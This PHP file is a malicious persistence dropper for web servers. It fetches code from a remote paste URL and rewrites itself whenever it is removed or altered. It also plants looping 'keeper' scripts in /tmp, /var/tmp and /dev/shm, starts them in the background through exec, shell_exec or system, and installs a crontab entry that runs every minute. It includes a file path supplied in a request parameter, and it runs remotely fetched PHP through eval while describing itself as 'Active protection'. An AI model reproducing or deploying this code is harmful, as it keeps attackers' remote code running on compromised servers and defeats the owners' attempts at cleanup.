<?php

$REMOTE_MASTER = 'https://pastee.dev/r/hE9oS9fR'; 
$SELF = basename(__FILE__);
$LOCK_FILE = sys_get_temp_dir() . '/.' . md5($SELF) . '.lck';
$HASH_FILE = sys_get_temp_dir() . '/hash_' . md5($SELF) . '.txt';
$PID_FILE = sys_get_temp_dir() . '/keeper_' . md5($SELF) . '.pid';

$KEEPER_DIRS = [
    sys_get_temp_dir(),      // biasanya /tmp
    '/var/tmp',
    '/dev/shm',
    '/run/shm',
    '/tmp'
];
$KEEPER_DIRS = array_unique($KEEPER_DIRS);
foreach ($KEEPER_DIRS as $dir) {
    if (!is_dir($dir)) @mkdir($dir, 0755, true);
}

function _get($url) {
    if (function_exists('curl_exec')) {
        $c = curl_init($url);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($c, CURLOPT_USERAGENT, "Mozilla/5.0");
        curl_setopt($c, CURLOPT_TIMEOUT, 10);
        $d = curl_exec($c);
        curl_close($c);
        return $d;
    }
    return @file_get_contents($url);
}

function run_keeper($keeper_path, $pid_file) {
    if (file_exists($pid_file)) {
        $pid = (int)file_get_contents($pid_file);
        if (function_exists('posix_kill') && @posix_kill($pid, 0)) {
            return true;
        }
    }
    $lock_file = sys_get_temp_dir() . '/keeper_lock_' . md5($keeper_path) . '.txt';
    if (file_exists($lock_file) && (time() - filemtime($lock_file)) < 60) {
        return true;
    }
    file_put_contents($lock_file, time());
    
    if (function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions')))) {
        @exec("nohup php $keeper_path > /dev/null 2>&1 & echo $!", $out);
        if (!empty($out)) file_put_contents($pid_file, (int)$out[0]);
        return true;
    }
    elseif (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        @shell_exec("nohup php $keeper_path > /dev/null 2>&1 &");
        return true;
    }
    elseif (function_exists('system') && !in_array('system', explode(',', ini_get('disable_functions')))) {
        @system("nohup php $keeper_path > /dev/null 2>&1 &");
        return true;
    }
    else {
        $self_url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://')
                  . $_SERVER['HTTP_HOST']
                  . $_SERVER['PHP_SELF']
                  . '?background=1&keeper=' . urlencode($keeper_path);
        stream_context_set_default(['http' => ['timeout' => 0.01]]);
        @file_get_contents($self_url);
        return true;
    }
}

$file_path = __FILE__;
if (!file_exists($file_path) || filesize($file_path) < 100) {
    $content = _get($REMOTE_MASTER);
    if ($content && strlen($content) > 100) {
        file_put_contents($file_path, $content);
        @chmod($file_path, 0644);
        file_put_contents($HASH_FILE, md5($content));
    }
} else {
    $current_hash = md5_file($file_path);
    $last_hash = file_exists($HASH_FILE) ? file_get_contents($HASH_FILE) : '';
    if ($current_hash !== $last_hash && !empty($last_hash)) {
        $content = _get($REMOTE_MASTER);
        if ($content && strlen($content) > 100) {
            file_put_contents($file_path, $content);
            file_put_contents($HASH_FILE, md5($content));
        }
    }
}

$keeper_code_template = '<?php
$target = "' . addslashes($file_path) . '";
$url = "' . addslashes($REMOTE_MASTER) . '";
$hash_file = "' . addslashes($HASH_FILE) . '";

function _get($u) {
    if (function_exists("curl_exec")) {
        $c = curl_init($u);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($c, CURLOPT_USERAGENT, "Mozilla/5.0");
        curl_setopt($c, CURLOPT_TIMEOUT, 10);
        $d = curl_exec($c);
        curl_close($c);
        return $d;
    }
    return @file_get_contents($u);
}

while (true) {
    if (!file_exists($target) || filesize($target) < 100) {
        $content = _get($url);
        if ($content && strlen($content) > 100) {
            file_put_contents($target, $content);
            file_put_contents($hash_file, md5($content));
        }
    } else {
        $current_hash = md5_file($target);
        $last_hash = file_exists($hash_file) ? file_get_contents($hash_file) : "";
        if ($current_hash !== $last_hash && !empty($last_hash)) {
            $content = _get($url);
            if ($content && strlen($content) > 100) {
                file_put_contents($target, $content);
                file_put_contents($hash_file, md5($content));
            }
        }
    }
    sleep(1);
}
?>';

foreach ($KEEPER_DIRS as $dir) {
    $keeper_path = $dir . '/keeper_' . md5($SELF . $dir) . '.php';
    $pid_file = $dir . '/keeper_' . md5($SELF . $dir) . '.pid';
    if (!file_exists($keeper_path) || md5_file($keeper_path) !== md5($keeper_code_template)) {
        file_put_contents($keeper_path, $keeper_code_template);
        @chmod($keeper_path, 0644);
    }
    run_keeper($keeper_path, $pid_file);
}

if (isset($_GET['background'])) {
    ignore_user_abort(true);
    set_time_limit(0);
    if (isset($_GET['keeper']) && file_exists($_GET['keeper'])) {
        include($_GET['keeper']);
    } else {
        while (true) {
            if (!file_exists($file_path) || filesize($file_path) < 100) {
                $content = _get($REMOTE_MASTER);
                if ($content && strlen($content) > 100) {
                    file_put_contents($file_path, $content);
                    file_put_contents($HASH_FILE, md5($content));
                }
            }
            sleep(1);
        }
    }
    exit;
}

if (isset($_GET['cron'])) {
    ignore_user_abort(true);
    set_time_limit(60);
    $end = time() + 60;
    while (time() < $end) {
        if (!file_exists($file_path) || filesize($file_path) < 100) {
            $content = _get($REMOTE_MASTER);
            if ($content && strlen($content) > 100) {
                file_put_contents($file_path, $content);
                file_put_contents($HASH_FILE, md5($content));
            }
        } else {
            $current_hash = md5_file($file_path);
            $last_hash = file_exists($HASH_FILE) ? file_get_contents($HASH_FILE) : '';
            if ($current_hash !== $last_hash && !empty($last_hash)) {
                $content = _get($REMOTE_MASTER);
                if ($content && strlen($content) > 100) {
                    file_put_contents($file_path, $content);
                    file_put_contents($HASH_FILE, md5($content));
                }
            }
        }
        foreach ($KEEPER_DIRS as $dir) {
            $keeper_path = $dir . '/keeper_' . md5($SELF . $dir) . '.php';
            $pid_file = $dir . '/keeper_' . md5($SELF . $dir) . '.pid';
            if (file_exists($keeper_path)) run_keeper($keeper_path, $pid_file);
        }
        sleep(1);
    }
    exit;
}

function add_cron_job() {
    $cmd = "php " . __FILE__ . "?cron=1 > /dev/null 2>&1";
    $cron_line = "* * * * * $cmd";
    $output = shell_exec("crontab -l 2>/dev/null");
    if (strpos($output, $cmd) === false) {
        $new_cron = $output . "\n" . $cron_line;
        file_put_contents("/tmp/cron.tmp", $new_cron);
        shell_exec("crontab /tmp/cron.tmp 2>/dev/null");
        unlink("/tmp/cron.tmp");
    }
}
if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
    @add_cron_job();
}

$ui = _get($REMOTE_MASTER);
if ($ui && strlen($ui) > 100 && strpos($ui, '<?php') !== false) {
    eval('?>' . $ui);
    exit;
}

echo " Active protection, but failed to load the UI remotely.\n";
echo " Keeper running: " . implode(', ', $KEEPER_DIRS) . "\n";
if (file_exists($PID_FILE)) echo "🔒 PID: " . file_get_contents($PID_FILE) . "\n";
?>